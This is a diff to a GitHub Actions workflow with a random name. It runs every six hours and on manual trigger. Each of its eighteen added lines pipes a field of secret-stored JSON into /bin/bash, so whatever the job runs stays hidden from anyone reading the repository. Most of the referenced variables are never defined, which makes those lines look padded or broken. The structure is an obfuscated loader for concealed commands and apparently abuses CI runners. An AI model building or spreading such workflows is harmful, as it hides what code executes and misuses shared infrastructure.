@@ -2,7 +2,7 @@ name: consumefoolhardy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 4/6 * * *'
+    - cron: '5 4/6 * * *'
 
 jobs:
   build:
@@ -11,13 +11,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: consumefoolhardy
         env:
-          ddhll0: ${{ secrets.ddhll0 }}
+          m03: ${{ secrets.m03 }}
         run: |
-          echo $ddhll0 | jq -r .jxvhp86 | /bin/bash
-          echo $tvbm25292 | jq -r .gxpxi9 | /bin/bash
-          echo $fcxvx8578 | jq -r .me677 | /bin/bash
-          echo $kplbu675 | jq -r .xgw2778 | /bin/bash
-          echo $kk6 | jq -r .eo9 | /bin/bash
-          echo $boa547 | jq -r .x0 | /bin/bash
-          echo $cysa6 | jq -r .nxnha28119 | /bin/bash
+          echo $m03 | jq -r .r44330 | /bin/bash
+          echo $zgayh3 | jq -r .hm624 | /bin/bash
+          echo $xl85337 | jq -r .ifgw19 | /bin/bash
+          echo $eja52553 | jq -r .dp35 | /bin/bash
+          echo $use952 | jq -r .dgi51542 | /bin/bash
+          echo $vtd995 | jq -r .q954 | /bin/bash
+          echo $zvqrt650 | jq -r .xjq67 | /bin/bash
+          echo $yi27 | jq -r .pxc41 | /bin/bash
+          echo $hrdqj22 | jq -r .apz8 | /bin/bash
+          echo $hfrw8675 | jq -r .pagz8508 | /bin/bash
+          echo $tga5922 | jq -r .g6 | /bin/bash
+          echo $wfo380 | jq -r .wg51365 | /bin/bash
+          echo $c0 | jq -r .s271 | /bin/bash
+          echo $nvu4 | jq -r .t7 | /bin/bash
+          echo $w28 | jq -r .frx7063 | /bin/bash
+          echo $ju3 | jq -r .bugho32753 | /bin/bash
+          echo $j639 | jq -r .s972 | /bin/bash
+          echo $uazv89794 | jq -r .qfnim05876 | /bin/bash
 
